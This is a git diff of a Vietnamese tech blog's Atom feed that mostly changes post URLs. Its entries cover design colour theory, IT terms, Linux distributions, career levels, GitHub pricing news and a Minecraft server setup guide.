+&lt;hr style=&quot;background: #000;&quot; /&gt;</content><author><name>Panadora</name></author><category term="[&quot;unixlinux&quot;, &quot;terminal&quot;]" /><summary type="html">Như bạn đã biết, các câu lệnh trong Terminal thực sự rất hữu dụng và giúp cho người sử dụng có thể thao tác cực nhanh mà không cần phải qua GUI rườm rà.</summary></entry><entry><title type="html">Khái niệm màu sắc trong thiết kế (phần 3)</title><link href="http://localhost:4000/khai-niem-mau-sac-trong-thiet-ke-p3.html" rel="alternate" type="text/html" title="Khái niệm màu sắc trong thiết kế (phần 3)" /><published>2020-05-14T00:00:00+07:00</published><updated>2020-05-14T00:00:00+07:00</updated><id>http://localhost:4000/khai-niem-mau-sac-trong-thiet-ke-p3</id><content type="html" xml:base="http://localhost:4000/khai-niem-mau-sac-trong-thiet-ke-p3.html">&lt;p&gt;Chào các bạn, mình sẽ tiếp tục với series của Khái niệm màu sắc trong thiết kế (phần 3)&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/image/2020514ColorP3.jpg&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;hr /&gt;
@@ -45,7 +448,7 @@
 &lt;p&gt;Cảm ơn các bạn đã ghé qua blog của mình, đừng quên ấn nút share để bạn bè cùng biết đến nhé !&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://congnghevacuocsong.tk/khai-niem-mau-sac-trong-thiet-ke-p1&quot;&gt;khái niệm màu sắc trong thiết kế Phần 1&lt;/a&gt; &lt;br /&gt;
-&lt;a href=&quot;https://congnghevacuocsong.tk/khai-niem-mau-sac-trong-thiet-ke-p2&quot;&gt;khái niệm màu sắc trong thiết kế Phần 2&lt;/a&gt; &lt;br /&gt;&lt;/p&gt;</content><author><name>Panadora</name></author><category term="[&quot;graphics&quot;, &quot;news&quot;, &quot;css&quot;]" /><category term="color" /><category term="graphics" /><category term="màu sắc" /><category term="khái niệm màu sắc" /><summary type="html">Chào các bạn, mình sẽ tiếp tục với series của khái niệm màu sắc trong thiết kế phần 3.</summary></entry><entry><title type="html">Một số thuật ngữ chuyên ngành CNTT</title><link href="http://localhost:4000/mot-so-thuat-ngu-chuyen-nganh-cntt" rel="alternate" type="text/html" title="Một số thuật ngữ chuyên ngành CNTT" /><published>2020-05-03T00:00:00+07:00</published><updated>2020-05-03T00:00:00+07:00</updated><id>http://localhost:4000/mot-so-thuat-ngu-chuyen-nganh-cntt</id><content type="html" xml:base="http://localhost:4000/mot-so-thuat-ngu-chuyen-nganh-cntt">&lt;p&gt;&lt;img src=&quot;/image/202053-title-image-tn.jpg&quot; alt=&quot;here-image-title&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
+&lt;a href=&quot;https://congnghevacuocsong.tk/khai-niem-mau-sac-trong-thiet-ke-p2&quot;&gt;khái niệm màu sắc trong thiết kế Phần 2&lt;/a&gt; &lt;br /&gt;&lt;/p&gt;</content><author><name>Panadora</name></author><category term="[&quot;graphics&quot;, &quot;news&quot;, &quot;css&quot;]" /><category term="color" /><category term="graphics" /><category term="màu sắc" /><category term="khái niệm màu sắc" /><summary type="html">Chào các bạn, mình sẽ tiếp tục với series của khái niệm màu sắc trong thiết kế phần 3.</summary></entry><entry><title type="html">Một số thuật ngữ chuyên ngành CNTT</title><link href="http://localhost:4000/mot-so-thuat-ngu-chuyen-nganh-cntt.html" rel="alternate" type="text/html" title="Một số thuật ngữ chuyên ngành CNTT" /><published>2020-05-03T00:00:00+07:00</published><updated>2020-05-03T00:00:00+07:00</updated><id>http://localhost:4000/mot-so-thuat-ngu-chuyen-nganh-cntt</id><content type="html" xml:base="http://localhost:4000/mot-so-thuat-ngu-chuyen-nganh-cntt.html">&lt;p&gt;&lt;img src=&quot;/image/202053-title-image-tn.jpg&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Từ chuyên ngành luôn là hành trang cần thiết đối với một comtor, nhất là đối với một comtor chưa có kinh nghiệm trong lĩnh vực CNTT thì việc hiểu ý nghĩa của từ chuyên ngành cũng là một điều không thể thiếu. Chính vì vậy, trong bài viết này mình xin giới thiệu về khái niệm của một số từ chuyên ngành trong lĩnh vực CNTT này.&lt;/p&gt;
 
@@ -133,7 +536,7 @@
 
 &lt;p&gt;&lt;strong&gt;Usability&lt;/strong&gt; : Là tính năng “dễ sử dụng” của phần mềm hay của website. Có thể dễ dàng truy cập vào nhiều chức năng, không cảm thấy phiền toái hay khó chịu khi sử dụng chính là mục tiêu tối ưu của usability.&lt;/p&gt;
 
-&lt;hr /&gt;</content><author><name>Panadora</name></author><category term="[&quot;other&quot;, &quot;news&quot;]" /><summary type="html">Từ chuyên ngành luôn là hành trang cần thiết đối với một comtor</summary></entry><entry><title type="html">Tìm hiểu về distro linux</title><link href="http://localhost:4000/tim-hieu-ve-distro-linux" rel="alternate" type="text/html" title="Tìm hiểu về distro linux" /><published>2020-04-25T00:00:00+07:00</published><updated>2020-04-25T00:00:00+07:00</updated><id>http://localhost:4000/tim-hieu-ve-distro-linux</id><content type="html" xml:base="http://localhost:4000/tim-hieu-ve-distro-linux">&lt;p&gt;&lt;strong&gt;Distro Linux là gì?. Nên dùng Distro Linux nào, chúng có gì khác nhau ?&lt;/strong&gt;&lt;/p&gt;
+&lt;hr /&gt;</content><author><name>Panadora</name></author><category term="[&quot;other&quot;, &quot;news&quot;]" /><summary type="html">Từ chuyên ngành luôn là hành trang cần thiết đối với một comtor</summary></entry><entry><title type="html">Tìm hiểu về distro linux</title><link href="http://localhost:4000/tim-hieu-ve-distro-linux.html" rel="alternate" type="text/html" title="Tìm hiểu về distro linux" /><published>2020-04-25T00:00:00+07:00</published><updated>2020-04-25T00:00:00+07:00</updated><id>http://localhost:4000/tim-hieu-ve-distro-linux</id><content type="html" xml:base="http://localhost:4000/tim-hieu-ve-distro-linux.html">&lt;p&gt;&lt;strong&gt;Distro Linux là gì?. Nên dùng Distro Linux nào, chúng có gì khác nhau ?&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;Bạn mới tìm hiểu về Linux và chưa biết Distro Linux là gì, các bản distro linux có gì giống và khác nhau. Hãy xem bài viết dưới đây của HostingViet.&lt;/p&gt;
 
@@ -253,7 +656,7 @@
 
 &lt;p&gt;Tuy nhiên linux ko dành mục đích để chơi game vì thế sẽ là trở ngại lớn cho các game thủ khi đặt chân vào con đường này, tuy nhiên ko có nghĩa là linux không thể chơi game, và bạn vẫn có thể giải trí nhẹ với các tự game văn phòng, hoặc &lt;code class=&quot;highlighter-rouge&quot;&gt;Steam&lt;/code&gt; phần mềm này đã hổ trợ trên linux 1 thời gian dài và hầu như có những tựa game ko thua kém gì trên windows, và buộc bạn chi 1 số tiền ko ít để sỡ hữu những tưa game support trên linux. Còn 1 tin vui cho các ae game thủ là các ông lớn về mãng đồ họa cũng đã có động thái support lên cho các dùng distro linux&lt;/p&gt;
 
-&lt;p&gt;Vì thế sẽ không còn xa nếu linux tiếp tục được phát triển và vươn lên thành hệ điều hành thứ 2 của người dùng và thoát khỏi cái bóng thống trị của windows (Microssoft) !&lt;/p&gt;</content><author><name>Panadora</name></author><category term="[&quot;unixlinux&quot;, &quot;other&quot;, &quot;news&quot;]" /><summary type="html">Distro Linux là gì?. Nên dùng Distro Linux nào, chúng có gì khác nhau ?</summary></entry><entry><title type="html">Junior là gì? Senior là gì?</title><link href="http://localhost:4000/junior-la-gi-senior-la-gi" rel="alternate" type="text/html" title="Junior là gì? Senior là gì?" /><published>2020-04-22T00:00:00+07:00</published><updated>2020-04-22T00:00:00+07:00</updated><id>http://localhost:4000/junior-la-gi-senior-la-gi</id><content type="html" xml:base="http://localhost:4000/junior-la-gi-senior-la-gi">&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/2020422JvsS.jpg&quot; width=&quot;600&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;Vì thế sẽ không còn xa nếu linux tiếp tục được phát triển và vươn lên thành hệ điều hành thứ 2 của người dùng và thoát khỏi cái bóng thống trị của windows (Microssoft) !&lt;/p&gt;</content><author><name>Panadora</name></author><category term="[&quot;unixlinux&quot;, &quot;other&quot;, &quot;news&quot;]" /><summary type="html">Distro Linux là gì?. Nên dùng Distro Linux nào, chúng có gì khác nhau ?</summary></entry><entry><title type="html">Junior là gì? Senior là gì?</title><link href="http://localhost:4000/junior-la-gi-senior-la-gi.html" rel="alternate" type="text/html" title="Junior là gì? Senior là gì?" /><published>2020-04-22T00:00:00+07:00</published><updated>2020-04-22T00:00:00+07:00</updated><id>http://localhost:4000/junior-la-gi-senior-la-gi</id><content type="html" xml:base="http://localhost:4000/junior-la-gi-senior-la-gi.html">&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/2020422JvsS.jpg&quot; width=&quot;600&quot; /&gt;&lt;/center&gt;
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Junior, Senior là các thuật ngữ dùng để  phân chia trình độ giữa những người làm trong một công ty, trong một ngành hay trong một lĩnh vực nào đó&lt;/strong&gt;&lt;/p&gt;
@@ -288,519 +691,4 @@
 
 &lt;p&gt;– Kỹ năng giao tiếp: khi bạn làm mentor cho những người mới vào làm, bạn phải giao tiếp tốt với họ, giúp đỡ họ hòa nhập với cộng đồng công ty. Giao tiếp tốt sẽ giúp bạn dễ trình bày quan điểm, truyền tải được ý tưởng, tránh những hiểu lầm không đáng có.&lt;/p&gt;
 
-&lt;p&gt;Như vậy, Senior và Junior có sự khác biệt về kinh nghiệm cũng như trong trình độ và chuyên môn. Có một điểm giống giữa Senior và Junior đó là phải luôn luôn học hỏi tìm tòi cái mới, trau dồi kiến thức mỗi ngày. Trong môi trường khắc nghiệt như hiện nay, dù bạn có là Senior, nếu không chịu cập nhật kiên thức, giữ khư khư cái cũ, bạn sẽ nhanh chóng lỗi thời và bị đào thải. Do vậy, Senior nên giữ mindset của một junor luôn học hỏi cố gắng hoàn thiện bản thân, tiếp thu những điều mới lạ ở môi trường làm việc xung quanh.&lt;/p&gt;</content><author><name>Pandora</name></author><category term="[&quot;other&quot;, &quot;news&quot;]" /><summary type="html">Junior, Senior là các thuật ngữ dùng để phân chia trình độ giữa những người làm trong một công ty, trong một ngành hay trong một lĩnh vực nào đó.</summary></entry><entry><title type="html">GitHub miễn phí tất cả các tính năng cho người dùng</title><link href="http://localhost:4000/github-mien-phi-tat-ca-cac-tinh-nang-cho-nguoi-dung" rel="alternate" type="text/html" title="GitHub miễn phí tất cả các tính năng cho người dùng" /><published>2020-04-20T00:00:00+07:00</published><updated>2020-04-20T00:00:00+07:00</updated><id>http://localhost:4000/github-mien-phi-tat-ca-cac-tinh-nang-cho-nguoi-dung</id><content type="html" xml:base="http://localhost:4000/github-mien-phi-tat-ca-cac-tinh-nang-cho-nguoi-dung">&lt;p&gt;&lt;img src=&quot;/image/2020420Github.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;GitHub là một dịch vụ cung cấp kho lưu trữ mã nguồn Git dựa trên nền web cho các dự án phát triển phần mềm. GitHub cung cấp cả phiên bản trả tiền lẫn miễn phí cho các tài khoản. Sau khi cung cấp kho lưu trữ cá nhân không giới hạn cho người dùng miễn phí vào năm ngoái, mới đây GitHub tiếp tục cung cấp miễn phí các tính năng cốt lõi của mình cho mọi người dùng.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://betanews.com/wp-content/uploads/2018/06/microsoft-github.jpg&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Trước đây, nếu một tổ chức muốn sử dụng nền tảng dành cho nhà phát triển của GitHub để phát triển một dự án riêng, họ sẽ phải đăng ký một gói trả phí của GitHub. Tuy nhiên, GitHub tin rằng không nên để việc trả phí trở thành rào cản đối với các nhà phát triển muốn tham gia vào nền tảng của mình.&lt;/p&gt;
-
-&lt;p&gt;Các nhà phát triển cá nhân giờ đây cũng có thể mời cộng tác viên tham gia vào dự án của mình với số lượng không giới hạn, và cũng không bị tính phí. Tất cả các tính năng cốt lõi của GitHub đều được cung cấp miễn phí cho tất cả người dùng.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://genk.mediacdn.vn/139269124445442048/2020/4/15/mwsnap007-15869374809661133754848.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Bên cạnh đó thì GitHub vẫn có hai gói trả phí là GitHub Team và GitHub Enterprise. Gói GitHub Team có mức phí chỉ còn 4 USD/tháng (trước đây là 9USD), cung cấp 2GB lưu trữ package và 3.000 hành động/tháng, code riêng tư.&lt;/p&gt;
-
-&lt;p&gt;Nguồn tin từ: &lt;a href=&quot;https://techtalk.vn/github-mien-phi-tat-ca-cac-tinh-nang-cho-nguoi-dung.html&quot;&gt;TECK TALL&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name>Panadora</name></author><category term="news" /><summary type="html">GitHub là một dịch vụ cung cấp kho lưu trữ mã nguồn Git dựa trên nền web cho các dự án phát triển phần mềm.</summary></entry><entry><title type="html">Hướng dẫn tạo server minecraft ( Phần 1 )</title><link href="http://localhost:4000/huong-dan-tao-server-minecraft-p1" rel="alternate" type="text/html" title="Hướng dẫn tạo server minecraft ( Phần 1 )" /><published>2020-04-18T00:00:00+07:00</published><updated>2020-04-18T00:00:00+07:00</updated><id>http://localhost:4000/huong-dan-tao-server-minecraft-p1</id><content type="html" xml:base="http://localhost:4000/huong-dan-tao-server-minecraft-p1">&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://vi.wikipedia.org/wiki/Minecraft&quot;&gt;Minecraft&lt;/a&gt; là một tựa game độc lập trong một thế giới mở. Ban đầu nó được tạo ra bởi lập trình viên người Thụy Điển &lt;a href=&quot;https://vi.wikipedia.org/wiki/Markus_%22Notch%22_Persson&quot;&gt;Markus “Notch” Persson&lt;/a&gt; và sau đó được phát triển và phát hành bởi &lt;a href=&quot;https://vi.wikipedia.org/wiki/Mojang&quot;&gt;Mojang&lt;/a&gt;. Tựa game có đồ họa không mấy hấp dẫn những thu hút đông đảo số người chơi đặt biệt là thanh thiếu niên và trẻ em, vì lối chơi của tựa game này mạng lại tính sáng tạo và đầy thú vị với những khối block hình vuông với động, thực vật có hình thù vui nhộm. &lt;code class=&quot;highlighter-rouge&quot;&gt;Minecraft&lt;/code&gt;cho phép người chơi xây dựng các công trình bằng cách xây các khối kết cấu hình vuông trong một thế giới 3D.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Game bao gồm các chế độ chơi: &lt;code class=&quot;highlighter-rouge&quot;&gt;Sinh Tồn, Sáng tạo, Phiêu lưu&lt;/code&gt;. Chi tiết tại &lt;a href=&quot;https://vi.wikipedia.org/wiki/Minecraft&quot;&gt;wikipedia&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Ngoài ra game cho phép kết nối Online để có thể chơi game cùng bạn bè qua việc tạo server và sau đây là bài viết hướng dẫn tạo server minecraft để chơi cùng bạn bè.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418CreateServerMinecraft.jpg&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h3 style=&quot;font-weight: bold;&quot;&gt;Hướng dẫn tải Server Minecraft&lt;/h3&gt;
-
-&lt;p&gt;Để có thể tạo server đầu tiên các bạn cần file để chạy server, các bạn có thể download phiên bản server minecarft bạn cần dưới đây.&lt;/p&gt;
-
-&lt;p style=&quot;border: 3px double #242424; background: #dddd; font-style: italic; border-radius: 5px;&quot;&gt;Chú ý: lời khuyên mình  dành cho các bạn là để server có thể ổn định các bạn có thể tải phiên bản server thấp hơn một chút đối với phiên bản mới nhất hiện tại của minecraft.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://getbukkit.org/download/vanilla&quot;&gt;Vanilla&lt;/a&gt;: Tổng hợp các phiên bản server minecraft không sử dụng plugins/addons&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://getbukkit.org/download/craftbukkit&quot;&gt;Craft Bukkit&lt;/a&gt;: Tổng hợp các phiên bản server minecraft cho phép sử dụng plugins/addons&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://getbukkit.org/download/spigot&quot;&gt;Spigot&lt;/a&gt;: Tương tự như &lt;code class=&quot;highlighter-rouge&quot;&gt;Craft Bukkit&lt;/code&gt; nôm na là phiên bản nâng cấp từ Craft Bukkit, đặt biệt server &lt;code class=&quot;highlighter-rouge&quot;&gt;Spigot&lt;/code&gt; có thể cho phép người chơi vào server từ nhiền phiên bản khác nhau, như trong các server Online bạn để ý dòng Title của server sẽ có hổ trợ từ ( 1.7 - 1.8 ) đó là server đang sử dụng &lt;code class=&quot;highlighter-rouge&quot;&gt;Spigot&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 style=&quot;font-weight: bold;&quot;&gt;Tạo Server Minecraft&lt;/h3&gt;
-
-&lt;p&gt;Sau khi download phiên bản file server bạn cần, thì việc bạn cần làm bây giờ là tạo 1 thư mục chưa file server download vừa rồi và bật nó lên, lưu ý để có thể chạy được file server thì máy tính bạn bắt buộc phải có &lt;code class=&quot;highlighter-rouge&quot;&gt;java&lt;/code&gt; để chạy file server.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Để kiểm trả phiên bản java có trong máy tính của bạn thao tác như sau: Nhấm tổ hợp phím &lt;code class=&quot;highlighter-rouge&quot;&gt;Start + r &lt;/code&gt; mở &lt;code class=&quot;highlighter-rouge&quot;&gt;Command Prompt&lt;/code&gt; gõ lệnh:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-   &lt;span class=&quot;nx&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;nếu nó hiển thị như vậy tức là máy tính của bạn đã cài java&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;
-	java version &quot;1.6.0_13&quot;
-	Java(TM) SE Runtime Environment (build 1.6.0_13-b03)
-	Java HotSpot(TM) Client VM (build 11.3-b02, mixed mode, sharing)
-
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Nếu không có bạn có thể tải java tại đây:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://javadl.oracle.com/webapps/download/AutoDL?BundleId=242057_3d5a2bb8f8d4428bbe94aed7ec7ae784&quot;&gt;Java online&lt;/a&gt;&lt;br /&gt;
-&lt;a href=&quot;https://javadl.oracle.com/webapps/download/AutoDL?BundleId=242058_3d5a2bb8f8d4428bbe94aed7ec7ae784&quot;&gt;Java 32bit offline&lt;/a&gt;&lt;br /&gt;
-&lt;a href=&quot;https://javadl.oracle.com/webapps/download/AutoDL?BundleId=242060_3d5a2bb8f8d4428bbe94aed7ec7ae784&quot;&gt;Java 64bit offline&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Nếu đã cài sẵn Java thì bạn không &lt;code class=&quot;highlighter-rouge&quot;&gt;restart&lt;/code&gt; lại máy, nếu bạn mới cài java thì bạn cần &lt;code class=&quot;highlighter-rouge&quot;&gt;restart&lt;/code&gt; hoặc &lt;code class=&quot;highlighter-rouge&quot;&gt;login out&lt;/code&gt; lại máy, sau đó thao tác theo các hướng dẫn sau để tạo server minecraft.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/minecraft-folder-1.png&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Double click chuột&lt;/code&gt; vào file server trong thư mục bạn đã tạo, sau đó đợi file tiến hành giải nén thêm một số file khác như sau:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/minecraft-folder-2.png&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Double chuột phải&lt;/code&gt; vào file eula.txt và sửa đổi &lt;code class=&quot;highlighter-rouge&quot;&gt;eula=false&lt;/code&gt; thành &lt;code class=&quot;highlighter-rouge&quot;&gt;eula=true&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/minecraft-eula-text.png&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + s&lt;/code&gt; để &lt;code class=&quot;highlighter-rouge&quot;&gt;save&lt;/code&gt; lại file eula.txt đã sửa sau đó tiền hành, mở file &lt;code class=&quot;highlighter-rouge&quot;&gt;server.properties&lt;/code&gt; bằng cách click chuột phải và chọn &lt;code class=&quot;highlighter-rouge&quot;&gt;Open With&lt;/code&gt; Text rồi chú ý và sửa đổi như sau:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;query.port=25565&lt;/code&gt; : Cổng để hiển thị thông tin, khi người chơi nhập địa chỉ server sẽ hiện thị (Online/Offline, số người đang chơi, Ping…)&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gamemode=survival&lt;/code&gt;: Chọn chế độ chơi cho server mặt định sẽ là &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Survival (Sinh Tồn)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;enable-query=true&lt;/code&gt;: nếu true cái này thì bên ngoài sẽ biết được thông tin của Server (Online/Offline, số người đang chơi, Ping…)&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;difficulty=easy&lt;/code&gt; : Chọn mức độ của map mặt định sẽ là &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;easy (Dễ)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pvp=true&lt;/code&gt; : &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;&lt;/strong&gt; cho phép người chơi giết lân nhau, &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt;&lt;/strong&gt; ngược lại.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;max-players=20&lt;/code&gt; : Cho phép số lượng người chơi tham gia server.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;max-world-size=29999984&lt;/code&gt; : Kích thước tối đa của thế giới&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;server-port=25565&lt;/code&gt; : &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;port (cổng)&lt;/code&gt;&lt;/strong&gt; để người chơi kết nối tới server của bạn&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;server-ip=&lt;/code&gt; : địa chỉ &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IP&lt;/code&gt;&lt;/strong&gt; để người chơi kết nối tới server của bạn (mặt định sẽ là tự động bắt và mở IP ) của server bạn&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;view-distance=10&lt;/code&gt; : Tầm nhìn trong thế giới server mặt định là 10 hoặc 12 hoặc có thể lớn hơn.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;resource-pack=&lt;/code&gt; : gói tài nguyên, (theme) cho server của bạn. Tốt nhất là để mặt định, vì khi thêm &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;resource pack&lt;/code&gt;&lt;/strong&gt; nó có thể gây lag server&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;online-mode=false&lt;/code&gt; : &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;&lt;/strong&gt; chỉ dành cho Minecraft có bản quyền mới vào được server, &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt;&lt;/strong&gt; dành cho cả 2, bản quyền hay không bản quyền đều vào được server&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;motd=A Minecraft Server&lt;/code&gt; : Title (tiêu đề cho server) có thể bạn đặt tên thú vị hơn cho server của bạn.&lt;/p&gt;
-
-&lt;p&gt;Sau khi hoàn thành các bạn &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl + s&lt;/code&gt;&lt;/strong&gt; để &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;save&lt;/code&gt;&lt;/strong&gt; lại &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;server.properties&lt;/code&gt;&lt;/strong&gt; và tiến hành tại thêm một file có đuôi là &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.bat&lt;/code&gt;&lt;/strong&gt; để chạy server năm trong thư mục Server Minecraft của bạn, &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Click chuột phải&lt;/code&gt;&lt;/strong&gt; chọn edit và nhập dòng lệnh sau:&lt;/p&gt;
-
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;
-	/* 
-	* spigot-1.15.jar là tên file server của bạn đã tải về.
-	* -Xms1024M -Xmx2048M sử dụng từ 1GB - 2GB của máy tính khi tạo
-	*/
-
-	java -Xms1024M -Xmx2048M -jar spigot-1.15.jar nogui
-
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Hoặc bạn có thể tải file.bat &lt;a href=&quot;https://www.mediafire.com/file/z32ejk3b13q4nwz/start-server.bat/file&quot;&gt;tại đây&lt;/a&gt; sau đó bỏ vào thư mục chứa file server của bạn và click chuột vào file start-server.bat để tiến hành khởi động server.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/minecraft-file-server.png&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Như vậy các bạn hoàn thành cách tạo server minecraft, tuy nhiên để có thể chơi &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;online&lt;/code&gt;&lt;/strong&gt; cùng bạn bè thì bạn cần phải mở &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;port&lt;/code&gt;&lt;/strong&gt; của server để bạn bè có thể tham gia cùng bạn.&lt;/p&gt;
-
-&lt;p&gt;Mời các bạn liên kết đến &lt;a href=&quot;/huong-dan-tao-server-minecraft-p2.html&quot;&gt;Hướng dẫn tạo server minecraft ( Phần 2 )&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr /&gt;</content><author><name>Panadora</name></author><category term="[&quot;games&quot;, &quot;news&quot;]" /><summary type="html">Minecraft là một tựa game độc lập trong một thế giới mở.</summary></entry><entry><title type="html">Hướng dẫn tạo server minecraft ( Phần 2 )</title><link href="http://localhost:4000/huong-dan-tao-server-minecraft-p2" rel="alternate" type="text/html" title="Hướng dẫn tạo server minecraft ( Phần 2 )" /><published>2020-04-18T00:00:00+07:00</published><updated>2020-04-18T00:00:00+07:00</updated><id>http://localhost:4000/huong-dan-tao-server-minecraft-p2</id><content type="html" xml:base="http://localhost:4000/huong-dan-tao-server-minecraft-p2">&lt;p&gt;&lt;img src=&quot;/image/2020418NetherPotal.jpg&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Tiếp tục với phần 2 của &lt;a href=&quot;http://localhost:4000/huong-dan-tao-server-minecraft-p1&quot;&gt;Hướng dẫn tạo server minecarft&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
-
-&lt;h3 style=&quot;font-weight: bold;&quot;&gt;Mở Port/Server Minecraft&lt;/h3&gt;
-
-&lt;p&gt;Bước này khá quan trọng trong việc bạn bè của bạn có thể kết nối tới server minecarft của bạn chơi cùng.&lt;/p&gt;
-
